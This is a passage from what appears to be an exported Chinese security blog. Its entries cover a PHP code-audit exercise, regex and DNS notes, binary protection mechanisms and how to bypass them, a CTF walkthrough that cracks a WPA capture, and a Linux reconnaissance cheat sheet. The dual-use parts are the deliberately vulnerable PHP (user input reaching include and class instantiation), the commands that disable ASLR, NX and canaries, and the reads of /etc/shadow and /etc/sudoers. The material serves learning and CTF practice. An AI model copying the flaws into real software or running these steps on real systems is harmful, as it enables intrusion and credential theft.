    echo $this-&gt;twig-&gt;render(
      &#39;index.html&#39;,
      [&#39;link&#39; =&gt; $this-&gt;getNexSlideUrl()]
    );
  }
}

(new Template())-&gt;render();</code></pre><p><strong>Snow Flake</strong></p>
<pre><code>function __autoload($className) {
  include $className;
}

$controllerName = $_GET[&#39;c&#39;];
$data = $_GET[&#39;d&#39;];

if (class_exists($controllerName)) {
  $controller = new $controllerName($data[&#39;t&#39;], $data[&#39;v&#39;]);
  $controller-&gt;render();
} else {
  echo &#39;There is no page with this name&#39;;
}

class HomeController {
  private $template;
  private $variables;

  public function __construct($template, $variables) {
    $this-&gt;template = $template;
    $this-&gt;variables = $variables;
  }

  public function render() {
    if ($this-&gt;variables[&#39;new&#39;]) {
      echo &#39;controller rendering new response&#39;;
    } else {
      echo &#39;controller rendering old response&#39;;
    }
  }
}</code></pre><h2 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h2><ol>
<li><a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener">https://github.com/hongriSec/PHP-Audit-Labs</a></li>
<li><a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">https://www.ripstech.com/php-security-calendar-2017/</a></li>
<li><a href="https://www.php.net/manual/zh/" target="_blank" rel="noopener">PHP手册</a></li>
</ol>
]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>WordPress安全配置——未完待续</title>
    <url>/WordPress%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h2><ol>
<li>\ #标志特殊字符为原义字符，或下一字符为特殊字符，或进制字符</li>
<li>^ #字符串开始</li>
<li>$ #字符串结束</li>
<li>* #0次或多次</li>
<li>? #0次或1次</li>
<li>+ #1次或多次、</li>
<li>. #除\n之外的任何单个字符</li>
<li>\b #边界</li>
<li>\B #非单词边界</li>
<li>\d #数字字符</li>
<li>\D #非数字字符</li>
<li>\f #换页符</li>
<li>\n #换行符</li>
<li>\r #回车符</li>
<li>\s #任何空白字符</li>
<li>\S #任何非空白字符</li>
<li>\t #制表符</li>
<li>\v #垂直制表符</li>
<li>\w #任何单词字符，等价于[A-Za-z0-9_]</li>
<li>\W #任何非单词字符，等价于[^A-Za-z0-9_]</li>
<li>/regepx/i  #i 忽略大小写</li>
<li>a|b #匹配a或b</li>
<li>(a|b)c #匹配ac或bc</li>
</ol>
<h2 id="0x01-常用"><a href="#0x01-常用" class="headerlink" title="0x01 常用"></a>0x01 常用</h2><ol>
<li>/^{A-Za-z0-9_}{3,16}$/ #3至16位由A-Za-z0-9_组成</li>
</ol>
<h2 id="0x02-Python正则"><a href="#0x02-Python正则" class="headerlink" title="0x02 Python正则"></a>0x02 Python正则</h2><ol>
<li><p>import re #正则模块</p>
</li>
<li><p><strong>re.match()</strong> #从字符串开始位置开始匹配，有就有，无就None</p>
</li>
<li><p>re.match(匹配的正则表达式，匹配的字符串，标志位) </p>
</li>
<li><p>re.match(‘aa’,’aa.bb.cc’).span() #(0,2)</p>
</li>
<li><p>re.match(‘cc’,’aa.bb.cc’) #None</p>
</li>
<li><p>re.match(‘AA’,’aa.bb.cc’,re.M|re.I) #(0,2)，re.I：忽视大小写，re.M：匹配多行，re.L：特殊字符集，re.S：即.且包含换行，匹配任意字符（.不包含换行）</p>
</li>
<li><p><strong>re.search()</strong> #扫描整个字符串，返回第一个成功的匹配，无就None</p>
</li>
<li><p>re.search(‘bb’,’aa.bb.cc.bb’).span() #(3,5)</p>
</li>
<li><p><strong>re.compile()</strong> #自定义正则</p>
</li>
<li><p>reg=re.compile(r’[a-z]+’,re.I)</p>
</li>
<li><p>reg.match()</p>
</li>
<li><p>reg.search()</p>
</li>
<li><p><strong>re.findall()</strong> #匹配字符串的所有子串，返回列表，无则空列表</p>
</li>
<li><p><strong>re.finditer()</strong> #匹配字符串的所有子串，迭代器返回</p>
</li>
<li><p><strong>re.sub()</strong> #检索与替换</p>
</li>
</ol>
<h2 id="0xFF-链接"><a href="#0xFF-链接" class="headerlink" title="0xFF 链接"></a>0xFF 链接</h2><ol>
<li><a href="https://tool.oschina.net/uploads/apidocs/jquery/regexp.html" target="_blank" rel="noopener">https://tool.oschina.net/uploads/apidocs/jquery/regexp.html</a></li>
<li><a href="https://regex101.com/" target="_blank" rel="noopener">https://regex101.com/</a></li>
</ol>
]]></content>
      <tags>
        <tag>知识</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS记录</title>
    <url>/DNS%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="0x00-DNS记录"><a href="#0x00-DNS记录" class="headerlink" title="0x00 DNS记录"></a>0x00 DNS记录</h2><ol>
<li>A：ipv4地址</li>
<li>AAAA：ipv6地址</li>
<li>CNAME：域名的别名</li>
<li>MX：邮件域名的地址</li>
<li>PTR：IP反查域名</li>
<li>SRV：服务的ip地址记录，包含ip/port/priority/weight</li>
<li>TXT：域名的文本记录，记录联系方式、服务版本信息等</li>
<li>NS：名称服务器记录，DNS区域，指定哪个域名服务器可以解析该域名的子域名</li>
<li>SOA：授权机构记录，记录NS中哪个是主服务器</li>
</ol>
<h2 id="0x10-dig"><a href="#0x10-dig" class="headerlink" title="0x10 dig"></a>0x10 dig</h2><ol>
<li><img src="/DNS%E8%AE%B0%E5%BD%95/3.png" alt></li>
<li>1：dig命令的版本与输入的参数</li>
<li>2：显示服务返回的一些技术详情，重点在status，值为NOERROR，说明本次查询成功。</li>
<li>3：显示本次查询的域名</li>
<li>4：查询到的结果</li>
<li>5：本次查询的一些统计信息：多长时间，查询了哪些DNS服务器，在何时查询的</li>
<li>dig domain a</li>
<li><img src="/DNS%E8%AE%B0%E5%BD%95/1.png" alt></li>
<li>dig domain mx</li>
<li><img src="/DNS%E8%AE%B0%E5%BD%95/2.png" alt></li>
<li>dig domain +trace #+trace，dig会根据查询一直追踪直到查询到最终结果。</li>
<li><img src="/DNS%E8%AE%B0%E5%BD%95/4.png" alt></li>
</ol>
]]></content>
      <tags>
        <tag>知识</tag>
      </tags>
  </entry>
  <entry>
    <title>脑图</title>
    <url>/%E8%84%91%E5%9B%BE/</url>
    <content><![CDATA[<h2 id="网络攻击与防范"><a href="#网络攻击与防范" class="headerlink" title="网络攻击与防范"></a>网络攻击与防范</h2><ol>
<li><img src="/%E8%84%91%E5%9B%BE/1.jpeg" alt></li>
<li><img src="/%E8%84%91%E5%9B%BE/2.jpeg" alt></li>
</ol>
]]></content>
      <tags>
        <tag>知识</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN之程序常用的保护机制</title>
    <url>/PWN%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p><img src="/PWN%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/1.jfif" alt></p>
<h2 id="0x10-程序常用的保护机制"><a href="#0x10-程序常用的保护机制" class="headerlink" title="0x10 程序常用的保护机制"></a>0x10 程序常用的保护机制</h2><ol>
<li>数据执行保护，windows称为DEP（Data execution protection），Linux称为NX（No execute，不可执行）:栈不可执行。</li>
<li>地址随机化，ASLR（windows），PIE（Linux）</li>
</ol>
<h2 id="0x11-windows安全机制"><a href="#0x11-windows安全机制" class="headerlink" title="0x11 windows安全机制"></a>0x11 windows安全机制</h2><ol>
<li>GS编译技术</li>
<li>SEH的安全校验机制</li>
<li>Heap Cookie，Safe Unlinking等一序列堆安全机制</li>
<li>DEP数据执行保护</li>
<li>ASLR加载地址随机</li>
<li>SEHOP SEH的覆盖保护</li>
</ol>
<h2 id="0x12-地址随机化：PIE（ASLR，address-space-layout-randomization）"><a href="#0x12-地址随机化：PIE（ASLR，address-space-layout-randomization）" class="headerlink" title="0x12 地址随机化：PIE（ASLR，address space layout randomization）"></a>0x12 地址随机化：PIE（ASLR，address space layout randomization）</h2><ol>
<li>一般情况下（Linux）NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</li>
<li>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</li>
<li>内存地址随机化机制（ASLR)，有以下三种情况</li>
<li>0 - 表示关闭进程地址空间随机化。</li>
<li>1 - 表示将mmap的基址，stack和vdso页面随机化。</li>
<li>2 - 表示在1的基础上增加栈（heap）的随机化。</li>
<li><strong>Linux下关闭PIE的命令：</strong></li>
<li>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</li>
<li><strong>gcc编译命令：</strong></li>
<li>gcc -o test test.c // 默认情况下，不开启PIE</li>
<li>gcc -fpie -pie -o test test.c // 开启PIE，此时强度为1</li>
<li>gcc -fPIE -pie -o test test.c // 开启PIE，此时为最高强度2</li>
<li>gcc -fpic -o test test.c // 开启PIC，此时强度为1，不会开启PIE</li>
<li>gcc -fPIC -o test test.c // 开启PIC，此时为最高强度2，不会开启PIE</li>
<li><strong>windows下关闭映像随机化</strong></li>
<li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\MoveImages（没有就新建）</li>
<li>-1时，强制随机化</li>
<li><strong>堆栈随机化</strong></li>
<li>堆栈的基址是打开程序的时候确定的，同一个程序任意两次运行时的堆栈基址是不同的。</li>
<li><strong>PEB与TEB随机化</strong></li>
<li>微软在xp sp2之后不再使用固定的PEB基址0x7FFDF000和TEB基址0x7FFDE00</li>
<li><strong>绕过</strong></li>
<li>对于映像随机化，虽然模块的加载地址变了，但低2个字节不变。</li>
<li>对于ASLR堆栈随机化，可以使用JMP esp和heap spray等绕过限制</li>
<li>对于PEB和TEB的随机化，也是可以通过FS的偏移来定位的</li>
<li>利用部分覆盖进行定位内存地址</li>
<li>利用Heap spray进行内存地址定位</li>
<li>利用Java applet heap spray定位内存地址</li>
</ol>
<h2 id="0x13-CANNARY-栈保护"><a href="#0x13-CANNARY-栈保护" class="headerlink" title="0x13 CANNARY(栈保护)"></a>0x13 CANNARY(栈保护)</h2><ol>
<li>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</li>
<li>编译时可以控制是否开启栈保护以及程度</li>
<li>gcc -o test test.c // 默认情况下，不开启Canary保护</li>
<li>gcc -fno-stack-protector -o test test.c //禁用栈保护</li>
<li>gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</li>
<li>gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</li>
</ol>
<h2 id="0x14-FORTIFY"><a href="#0x14-FORTIFY" class="headerlink" title="0x14 FORTIFY"></a>0x14 FORTIFY</h2><ol>
<li>用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</li>
<li>gcc -o test test.c // 默认情况下，不会开这个检查</li>
<li>gcc -D_FORTIFY_SOURCE=1 -o test test.c // 较弱的检查</li>
<li>gcc -D_FORTIFY_SOURCE=2 -o test test.c // 较强的检查</li>
</ol>
<h2 id="0x15-数据执行保护：NX（DEP）"><a href="#0x15-数据执行保护：NX（DEP）" class="headerlink" title="0x15 数据执行保护：NX（DEP）"></a>0x15 数据执行保护：NX（DEP）</h2><ol>
<li><strong>Linux</strong> NX的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</li>
<li><strong>gcc编译命令：</strong></li>
<li>gcc -o test test.c // 默认情况下，开启NX保护</li>
<li>gcc -z execstack -o test test.c // 禁用NX保护</li>
<li>gcc -z noexecstack -o test test.c // 开启NX保护</li>
<li><strong>windows</strong> DEP的主要作用是阻止数据页（默认的堆，栈，内存池页）执行代码。分为软件DEP和硬件DEP，软件DEP即SafeSEH，硬件DEP操作系统通过设置内存页的NX属性标记是否在本页执行指令。</li>
<li><img src="/PWN%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/1.png" alt></li>
<li><strong>DEP分为4种工作态</strong></li>
<li>Optin：默认仅保护Windows系统组件</li>
<li>Optout：为排除列表程序外的所有程序和服务启用DEP</li>
<li>AlwaysOn：对所有进程启用DEP保护</li>
<li>AlwaysOff：对所有进程都禁用DEP</li>
<li>Visual Studio 2008之后默认开启DEP保护，编译的程序会在PE头中设置 IMAGE_DLLCHARACTERISTICS_NX_COMPAT标识，这个标识就在结构体IMAGE_OPTIONAL_HEADER 中DllCharacteristics，如果这个值被设为了0x0100表示采用了DEP保护编译。</li>
<li><strong>局限性</strong></li>
<li>并不是所有的CPU都支持DEP。</li>
<li>由于兼容性，不可能对所有的进程开辟DEP保护，这样会出现异常。对一些第三方插件DLL和ATL7.1或以前的程序版本，不会开启。</li>
<li>编译器中的/NXCOMPAT选项生成的程序，只会在Windows Vista以上的系统有效，在之前的系统会被忽略。</li>
<li>系统提供了某些API函数可以来控制DEP状态，早期的一些系统可以调用这些函数。</li>
<li><strong>绕过</strong></li>
<li>攻击未启用的DEP程序，并不是只要CPU和操作系统支持DEP，所有程序就安全，对于一些进程来说，只要有某一个模块不支持DEP，就不能开启DEP。</li>
<li><img src="/PWN%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/2.png" alt></li>
<li>利用Re2Libc挑战DEP，跳转到ZwSetInformationProcess函数将DEP关闭再转入shellcode执行。</li>
<li><strong>原理：</strong></li>
<li>一个进程的DEP设置标识保存在KPROCESS结构中的_KEXECUTE_OPTIONS 上，这个标识可以通过API函数ZwQueryInformationProcess 和 ZwSetInformationProcess 进行查询和修改。</li>
<li>在系统中找出一处关闭进程DEP的调用，微软有一个LdrpCheckNXCompatibility函数，当出现DLL收到SafeDisc保护的时候（函数中体现为al=1的时候），就会调用ZwSetInformationProcess函数进行关闭dep，所以我们可以在调用这个函数前把al的值改掉，就能够关闭dep。</li>
</ol>
<h2 id="0x16-RELRO"><a href="#0x16-RELRO" class="headerlink" title="0x16 RELRO"></a>0x16 RELRO</h2><ol>
<li>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。</li>
<li>gcc -o test test.c // 默认情况下，是Partial RELRO</li>
<li>gcc -z norelro -o test test.c // 关闭，即No RELRO</li>
<li>gcc -z lazy -o test test.c // 部分开启，即Partial RELRO</li>
<li>gcc -z now -o test test.c // 全部开启</li>
</ol>
<h2 id="0x17-总结"><a href="#0x17-总结" class="headerlink" title="0x17 总结"></a>0x17 总结</h2><ol>
<li>NX：-z execstack / -z noexecstack (关闭 / 开启)</li>
<li>Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)</li>
<li>PIE：-no-pie / -pie (关闭 / 开启)</li>
<li>RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)</li>
</ol>
<h2 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h2><ol>
<li><a href="https://introspelliam.github.io/2017/09/30/linux程序的常用保护机制/" target="_blank" rel="noopener">上善若水</a></li>
<li><a href="https://blog.csdn.net/m0_37809075/article/details/83008617" target="_blank" rel="noopener">https://blog.csdn.net/m0_37809075/article/details/83008617</a></li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN学习</title>
    <url>/PWN%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="0x00-PWN"><a href="#0x00-PWN" class="headerlink" title="0x00 PWN"></a>0x00 PWN</h2><ol>
<li><img src="/PWN%E5%AD%A6%E4%B9%A0/1.jfif" alt></li>
<li>“Pwn”是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似”砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被”黑”的电脑或手机就被你操纵了。</li>
</ol>
<h2 id="0x01-工具"><a href="#0x01-工具" class="headerlink" title="0x01 工具"></a>0x01 工具</h2><ol>
<li><a href="https://github.com/Gallopsled/pwntools/tree/stable" target="_blank" rel="noopener">pwntools</a>，一个CTF框架和漏洞利用开发库。</li>
<li><a href="https://pwntools.readthedocs.io/en/stable/" target="_blank" rel="noopener">工具帮助信息</a></li>
<li><a href="http://brieflyx.me/2015/python-module/pwntools-intro/" target="_blank" rel="noopener">工具基本使用信息</a></li>
<li><a href="http://brieflyx.me/2015/python-module/pwntools-advanced/" target="_blank" rel="noopener">工具高级使用信息</a></li>
<li><a href="https://github.com/Gallopsled/pwntools-binutils" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools-binutils</a></li>
<li><a href="https://github.com/aquynh/capstone" target="_blank" rel="noopener">反汇编框架</a></li>
<li></li>
</ol>
<h2 id="0x02-查壳"><a href="#0x02-查壳" class="headerlink" title="0x02 查壳"></a>0x02 查壳</h2><ol>
<li>工具：<a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="noopener">checksec</a></li>
<li>查壳命令：./checksec –file <file></file></li>
<li></li>
</ol>
<h2 id="0x03-脱壳"><a href="#0x03-脱壳" class="headerlink" title="0x03 脱壳"></a>0x03 脱壳</h2><ol>
<li>upx壳（例子）</li>
<li>脱壳命令：upx -d <file></file></li>
</ol>
<h2 id="0x10-例子1"><a href="#0x10-例子1" class="headerlink" title="0x10 例子1"></a>0x10 例子1</h2><ol>
<li><a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">XCTF</a>的<a href="/PWN学习/xctf-cgpwn2">xctf-cgpwn2</a></li>
<li>文件识别与运行</li>
<li><img src="/PWN%E5%AD%A6%E4%B9%A0/1.png" alt></li>
<li>查保护机制</li>
<li><img src="/PWN%E5%AD%A6%E4%B9%A0/2.png" alt></li>
<li>显示字符串窗口：shift+F12</li>
<li><img src="/PWN%E5%AD%A6%E4%B9%A0/3.png" alt></li>
<li>有个system，F5查看伪代码，结果打不开，postive sp value has been found，说明有负的栈指针</li>
<li><img src="/PWN%E5%AD%A6%E4%B9%A0/4.png" alt></li>
<li>选项——常规——勾选堆栈指针，多了框住的东西，就是栈指针</li>
<li><img src="/PWN%E5%AD%A6%E4%B9%A0/5.png" alt></li>
<li><img src="/PWN%E5%AD%A6%E4%B9%A0/6.png" alt></li>
<li>找出负的栈指针</li>
<li><img src="/PWN%E5%AD%A6%E4%B9%A0/7.png" alt></li>
<li>在负值指针处上一行，alt+k调整跟前面的一样</li>
<li><img src="/PWN%E5%AD%A6%E4%B9%A0/8.png" alt></li>
<li>再按F5即可查看伪代码</li>
<li><img src="/PWN%E5%AD%A6%E4%B9%A0/9.png" alt></li>
<li>没啥东西，查看hello的伪代码</li>
<li><img src="/PWN%E5%AD%A6%E4%B9%A0/10.png" alt></li>
<li>gets()函数，这可能存在溢出漏洞，双击前面name</li>
<li><img src="/PWN%E5%AD%A6%E4%B9%A0/11.png" alt></li>
<li></li>
</ol>
<p><a href="https://blog.csdn.net/macro_wing/article/details/99469676" target="_blank" rel="noopener">https://blog.csdn.net/macro_wing/article/details/99469676</a><br><a href="https://www.cnblogs.com/beiweisanshidu/p/10256449.html" target="_blank" rel="noopener">https://www.cnblogs.com/beiweisanshidu/p/10256449.html</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>2019红帽杯之恶臭的数据包</title>
    <url>/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/</url>
    <content><![CDATA[<h2 id="0x00-恶臭的数据包"><a href="#0x00-恶臭的数据包" class="headerlink" title="0x00 恶臭的数据包"></a>0x00 恶臭的数据包</h2><ol>
<li>下载文件，解压打开是个流量包cacosmia.pcap，wireshark打开，协议是802.11，加密的流量包，找到SSID是mamawoxiangwantiequan</li>
<li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/1.png" alt></li>
<li>使用kali的aircrack-ng，爆破cacosmia.pcap，命令：aircrack-ng ‘/root/4crypto/cacosmia.pcap’ -w /root/rockyou.txt，得密码12345678，（hashcat也行）</li>
<li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/2.png" alt></li>
<li>解密pcap包方法一，通过wireshark提供的转化网址，只需输入ssid和密码就能将其转化为PSK值<br><a href="https://www.wireshark.org/tools/wpa-psk.html" target="_blank" rel="noopener">https://www.wireshark.org/tools/wpa-psk.html</a></li>
<li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/3.png" alt></li>
<li>b42c77c0a8f4e6e99f851bed7b3f5a913caad442b96d5cd2a190e3f975b36d9f</li>
<li>wireshark打开cacosmia.pcap，编辑-首选项-protocols-IEEE 802.11-Edit</li>
<li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/4.png" alt></li>
<li>方法二：使用kali自带的解密工具，命令：airdecap-ng -p 12345678 -e mamawoxiangwantiequan ‘/root/4crypto/cacosmia.pcap’</li>
<li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/5.png" alt></li>
<li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/6.png" alt></li>
<li>得到cacosmia-dec.pcap，打开，搜索flag</li>
<li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/7.png" alt></li>
<li>导出到文件，文件-导出对象-HTTP-选中13.png，导出保存为png，使用kali的foremost分离图片</li>
<li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/8.png" alt></li>
<li>有个压缩包，解压要密码</li>
<li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/9.png" alt></li>
<li>继续追踪http流，session很奇怪</li>
<li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/10.png" alt></li>
<li>JWT解码，得到提示，密码是之前访问过的网站</li>
<li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/11.png" alt></li>
<li>找DNS记录，最终找到26rsfb.dnslog.cn是解压密码</li>
<li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/12.png" alt></li>
<li>flag</li>
<li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/13.png" alt></li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>encrypt_decrypt</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux_信息搜集_安全加固_入侵检测_应急响应</title>
    <url>/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<h2 id="0x00-Linux"><a href="#0x00-Linux" class="headerlink" title="0x00 Linux"></a>0x00 Linux</h2><p><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1.jfif" alt></p>
<ol>
<li><strong>注意：</strong>直接复制命令执行命令，可能会报错或没回显预计的结果，因为特殊字符是中文字符，如单双引号</li>
</ol>
<h2 id="0x10-信息搜集"><a href="#0x10-信息搜集" class="headerlink" title="0x10 信息搜集"></a>0x10 信息搜集</h2><h3 id="0x11-系统信息"><a href="#0x11-系统信息" class="headerlink" title="0x11 系统信息"></a>0x11 系统信息</h3><ol>
<li><strong><a href="https://ipcmen.com/uname" target="_blank" rel="noopener">uname -a</a> #显示操作系统相关信息</strong></li>
<li>uname -r #内核版本</li>
<li>cat /proc/version #内核版本</li>
<li>hostname #主机名</li>
<li>cat /etc/*-release #查看系统信息</li>
<li>cat /etc/hosts #hosts文件</li>
<li>cat /proc/cpuinfo #查看CPU信息</li>
<li>lspci -tv #列出所有PCI设备1</li>
<li>lsusb -tv #列出所有USB设备</li>
<li>lsmod #列出加载的内核模块</li>
<li><strong>uptime #查看系统运行时间、用户数、负载</strong></li>
<li>dmesg #显示开机信息</li>
<li>runlevel #查看系统运行级别</li>
<li>telinit 5 #切换至level 5</li>
</ol>
<h3 id="0x12-用户信息"><a href="#0x12-用户信息" class="headerlink" title="0x12 用户信息"></a>0x12 用户信息</h3><ol>
<li><strong>cat /etc/passwd #列出所有用户</strong></li>
<li>用户名：口令：用户ID：组ID：用户描述：主目录：登录shell</li>
<li><strong>cat /etc/shadow #列出所有用户hash（root权限）</strong></li>
<li>登录名：加密口令：最后一次修改时间：最小时间间隔：最大时间间隔：警告时间：不活动时间：失效时间：标志</li>
<li><strong>cat /etc/group #列出系统所有组</strong></li>
<li>finger #当前登录的用户</li>
<li>finger root #查看root用户的基本信息</li>
<li>users #当前登录的用户</li>
<li>who -a #当前登录的用户的基本信息</li>
<li><strong>whoami #当前用户</strong></li>
<li>w #当前登入系统的用户和正在执行的程序</li>
<li>last #显示登入过系统的用户信息</li>
<li><strong>lastlog #显示系统中所有用户最近一次登录系统信息</strong></li>
<li>who -r #查看系统运行级别</li>
</ol>
<h3 id="0x13-用户权限信息"><a href="#0x13-用户权限信息" class="headerlink" title="0x13 用户权限信息"></a>0x13 用户权限信息</h3><ol>
<li><strong>id #显示用户的id、所属群组的id</strong></li>
<li><strong>cat /etc/sudoers #查看可以sudo提升到root的用户（root权限）</strong></li>
<li>sudo #允许普通用户执行一些或全部的root命令的工具</li>
<li><strong>sudo -l #列出当前的权限</strong></li>
<li>su root #切换到root用户，需要root密码</li>
<li>umask #查看建立文件目录时的权限掩码</li>
</ol>
<h3 id="0x14-环境信息"><a href="#0x14-环境信息" class="headerlink" title="0x14 环境信息"></a>0x14 环境信息</h3><ol>
<li>env #输出系统环境信息</li>
<li>set #设置shell，输出系统环境信息</li>
<li>echo $PATH #输出环境变量中的路径信息</li>
<li>history #执行命令历史记录</li>
<li>cat ~/.bash_history #读取执行命令的历史记录</li>
<li><strong>pwd #当前路径信息</strong></li>
<li>cat /etc/profile #/etc/profile是永久性，全局环境变量 </li>
<li>cat /etc/shells #显示可用的shell</li>
<li>free -m #查看内存使用量与交换区使用量</li>
<li><strong>df -h #查看各分区使用情况</strong></li>
<li><strong>du -sh &lt;目录名&gt; #查看指定目录的大小</strong></li>
<li>mount | column -t #查看挂接的分区状态</li>
<li><strong>fdisk -l #查看所有分区</strong></li>
<li>swapon -s #查看所有交换分区</li>
<li>export #用于设置或显示环境变量</li>
</ol>
<h3 id="0x15-服务任务进程"><a href="#0x15-服务任务进程" class="headerlink" title="0x15 服务任务进程"></a>0x15 服务任务进程</h3><ol>
<li>ps aux #查看进程信息</li>
<li>ps -ef #查看进程信息</li>
